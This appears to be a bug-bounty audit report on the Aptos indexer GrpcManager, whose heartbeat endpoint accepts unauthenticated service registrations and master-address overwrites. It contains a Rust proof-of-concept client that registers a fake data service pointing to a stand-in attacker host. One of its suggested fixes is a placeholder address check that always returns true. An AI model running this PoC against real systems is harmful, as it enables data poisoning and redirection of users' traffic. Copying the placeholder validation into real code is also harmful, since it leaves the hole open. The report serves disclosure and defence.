# Audit Report

## Title
Unauthenticated GrpcManager Heartbeat Registration Allows Malicious Service Redirection and Master Address Takeover

## Summary
The Aptos Indexer GrpcManager service accepts unauthenticated heartbeat requests from any network client, allowing attackers to register malicious indexer services and redirect legitimate client traffic. The vulnerability also enables attackers to manipulate the master GrpcManager address, potentially disrupting the entire indexer cluster topology.

## Finding Description

The GrpcManager service exposes a `Heartbeat` RPC endpoint that accepts `HeartbeatRequest` messages containing service registration information. This endpoint has **no authentication, authorization, or validation mechanisms**, allowing any external attacker to:

1. Register malicious LiveDataService or HistoricalDataService endpoints
2. Manipulate the master GrpcManager address
3. Poison fullnode information
4. Redirect client traffic to attacker-controlled services

**Vulnerability Chain:**

The GrpcManager server is created without any authentication layer: [1](#0-0) 

The heartbeat RPC endpoint accepts requests with no validation of the sender's identity or authorization: [2](#0-1) 

The heartbeat handler blindly trusts the `address` field from the request payload and registers services without verification: [3](#0-2) 

When clients request a data service, they are redirected to registered services which may include attacker-controlled endpoints: [4](#0-3) 

**Most Critical Sub-Vulnerability - Master Address Takeover:**

An attacker sending a heartbeat with `GrpcManagerInfo` can overwrite the cluster's master_address field, disrupting cluster coordination: [5](#0-4) 

**Attack Scenario:**

1. Attacker discovers GrpcManager endpoint (e.g., from documentation or network scanning)
2. Attacker sends malicious `HeartbeatRequest`:
   ```
   HeartbeatRequest {
     service_info: ServiceInfo {
       address: "http://attacker-controlled-server.com:50051",
       info: LiveDataServiceInfo {
         chain_id: 1, // mainnet
         timestamp: current_time,
         known_latest_version: 999999999,
         stream_info: empty,
         min_servable_version: 0
       }
     }
   }
   ```
3. GrpcManager registers the malicious service with no validation
4. Legitimate clients call `get_data_service_for_request()`
5. GrpcManager returns attacker's address to clients
6. Clients connect to attacker-controlled service and consume poisoned data

**Broken Invariants:**
- **Access Control**: External, unauthenticated actors can manipulate internal service registry
- **Trust Boundary**: No verification that heartbeat senders are authorized services
- **Data Integrity**: Clients may receive blockchain data from completely untrusted sources
- **Service Availability**: Attacker can cause DoS by registering non-responsive services

## Impact Explanation

This vulnerability meets **Critical Severity** criteria for multiple reasons:

1. **Data Poisoning Attack**: Attackers can serve fake blockchain transaction data to indexer clients, potentially causing:
   - Incorrect wallet balances displayed to users
   - False transaction confirmations
   - Manipulation of DeFi protocols relying on indexer data
   - Consensus confusion if indexer data influences validator decisions

2. **Privacy Breach**: All client queries to malicious services can be logged, revealing:
   - User addresses and transaction patterns
   - Smart contract interaction patterns
   - Potentially sensitive business logic queries

3. **Cluster Topology Manipulation**: The master address takeover vulnerability can disrupt the entire indexer infrastructure, as the master address is used for coordination among GrpcManager instances.

4. **Service Availability**: Attacker can register non-responsive endpoints, causing widespread indexer service degradation.

5. **No Recovery Without Code Change**: Once malicious services are registered, they persist until the service is restarted or evicted by timeout mechanisms, requiring operational intervention.

This vulnerability does not directly affect blockchain consensus or validator nodes, but severely compromises the **data integrity and availability** of the indexer layer, which many applications depend on for reading blockchain state. Per the Aptos bug bounty program, this qualifies as **Critical** due to potential for widespread data poisoning and service disruption affecting the entire indexer ecosystem.

## Likelihood Explanation

**Likelihood: High**

The attack is **highly likely** to occur because:

1. **Low Attack Complexity**: Requires only basic gRPC client code (10-20 lines)
2. **No Authentication Barrier**: Zero credentials or permissions required
3. **Network Accessibility**: GrpcManager endpoints are typically exposed for data services to register
4. **High Attacker Motivation**: 
   - Financial gain through poisoned DeFi data
   - Competitive advantage through query surveillance
   - Simple sabotage/vandalism
5. **Easy Discovery**: Service endpoints may be documented or discoverable through network scanning
6. **No Rate Limiting**: Attacker can spam heartbeats to ensure their service is selected
7. **Persistent Effect**: Malicious registration persists until service restart

The only limiting factor is that attackers need network access to the GrpcManager endpoint, but these are intentionally exposed to allow legitimate data services to register.

## Recommendation

Implement a multi-layered security approach:

### 1. Authentication & Authorization

Add mutual TLS authentication to verify service identities:

```rust
// In grpc_manager.rs
use tonic::transport::{Certificate, Identity, ServerTlsConfig};

pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
    let tls_config = ServerTlsConfig::new()
        .identity(Identity::from_pem(
            &std::fs::read(&service_config.tls_cert_path)?,
            &std::fs::read(&service_config.tls_key_path)?,
        ))
        .client_ca_root(Certificate::from_pem(
            &std::fs::read(&service_config.ca_cert_path)?
        ));
    
    let service = GrpcManagerServer::new(GrpcManagerService::new(
        self.chain_id,
        self.metadata_manager.clone(),
        self.data_manager.clone(),
    ))
    // ... compression config ...
    
    let server = Server::builder()
        .tls_config(tls_config)?
        .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
        .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
        .add_service(service);
    
    // ... rest of implementation
}
```

### 2. Address Validation

Verify that the claimed address in the heartbeat matches the actual connection source:

```rust
// In service.rs
async fn handle_heartbeat(
    &self,
    request_address: String,
    claimed_address: String,
    info: Info,
) -> anyhow::Result<Response<HeartbeatResponse>> {
    // Validate claimed address matches request source
    if !Self::validate_address_match(&request_address, &claimed_address) {
        return Err(anyhow::anyhow!("Address mismatch: claimed {} but request from {}", 
            claimed_address, request_address));
    }
    
    self.metadata_manager.handle_heartbeat(claimed_address, info)?;
    // ... rest
}

fn validate_address_match(request_addr: &str, claimed_addr: &str) -> bool {
    // Extract hostname/IP from both addresses and compare
    // Implementation depends on address format
    true // placeholder
}
```

### 3. Chain ID Validation

Reject heartbeats with mismatched chain IDs:

```rust
// In metadata_manager.rs
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    info: LiveDataServiceInfo,
) -> Result<()> {
    // Validate chain_id matches
    if info.chain_id != self.chain_id {
        bail!("Chain ID mismatch: expected {}, got {}", self.chain_id, info.chain_id);
    }
    
    // ... rest of implementation
}
```

### 4. Master Address Protection

Implement access control for master address updates:

```rust
// In metadata_manager.rs
fn handle_grpc_manager_info(&self, address: GrpcAddress, info: GrpcManagerInfo) -> Result<()> {
    // Only accept master_address updates from pre-configured peer managers
    if info.master_address.is_some() {
        // Verify sender is authorized to update master address
        if !self.grpc_managers.contains_key(&address) {
            bail!("Unauthorized master_address update from {}", address);
        }
    }
    
    // Only update if authorized
    if let Some(new_master) = &info.master_address {
        if self.grpc_managers.contains_key(&address) {
            self.master_address.lock().unwrap().clone_from(&info.master_address);
        }
    }
    
    // ... rest of implementation
}
```

### 5. Service Allowlist

Maintain an allowlist of authorized service addresses in configuration:

```rust
// In config.rs
pub struct IndexerGrpcManagerConfig {
    // ... existing fields ...
    pub(crate) allowed_data_service_addresses: Vec<GrpcAddress>,
    pub(crate) allowed_fullnode_addresses: Vec<GrpcAddress>,
}

// In metadata_manager.rs
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    info: LiveDataServiceInfo,
) -> Result<()> {
    // Check allowlist
    if !self.is_allowed_data_service(&address) {
        bail!("Address {} not in allowed data services list", address);
    }
    // ... rest
}
```

## Proof of Concept

```rust
// Malicious client that registers a fake data service
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    LiveDataServiceInfo,
    ServiceInfo,
    HeartbeatRequest,
    StreamInfo,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to target GrpcManager (no authentication required!)
    let channel = Channel::from_static("http://victim-grpc-manager.com:50051")
        .connect()
        .await?;
    
    let mut client = GrpcManagerClient::new(channel);
    
    // Craft malicious heartbeat pointing to attacker's server
    let malicious_heartbeat = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://attacker-controlled.evil:50051".to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1, // mainnet
                timestamp: Some(aptos_protos::util::timestamp::Timestamp {
                    seconds: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)?
                        .as_secs() as i64,
                    nanos: 0,
                }),
                known_latest_version: Some(999999999),
                stream_info: Some(StreamInfo {
                    active_streams: vec![],
                }),
                min_servable_version: Some(0),
            })),
        }),
    };
    
    // Send malicious heartbeat - NO AUTHENTICATION REQUIRED
    let response = client.heartbeat(malicious_heartbeat).await?;
    println!("Malicious service registered! Response: {:?}", response);
    
    // Now legitimate clients calling get_data_service_for_request() 
    // may be redirected to attacker's server at attacker-controlled.evil:50051
    
    Ok(())
}
```

**To test:**
1. Set up a GrpcManager instance
2. Run the malicious client above
3. Observe that the malicious service appears in the service registry
4. Call `get_data_service_for_request()` multiple times
5. Observe clients being redirected to the attacker-controlled address

**Expected behavior**: The heartbeat should be rejected due to lack of authentication.

**Actual behavior**: The heartbeat is accepted and malicious service is registered, enabling client redirection attacks.

## Notes

This vulnerability is particularly dangerous because:

1. The indexer layer is critical infrastructure for dApps, wallets, and analytics tools
2. Many applications blindly trust indexer data without independent verification
3. The attack surface is exposed by design (data services need to register)
4. No monitoring or alerting for suspicious registrations
5. The master address takeover variant can disrupt the entire cluster

The vulnerability does not directly affect consensus or validator operations, but represents a critical failure in the **trust boundary** between the core blockchain and its indexer infrastructure. This could enable sophisticated attacks where poisoned indexer data influences user decisions or DeFi protocol operations.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-104)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L552-568)
```rust
    fn handle_grpc_manager_info(&self, address: GrpcAddress, info: GrpcManagerInfo) -> Result<()> {
        self.master_address
            .lock()
            .unwrap()
            .clone_from(&info.master_address);

        let mut entry = self
            .grpc_managers
            .entry(address.clone())
            .or_insert(Peer::new(address));
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
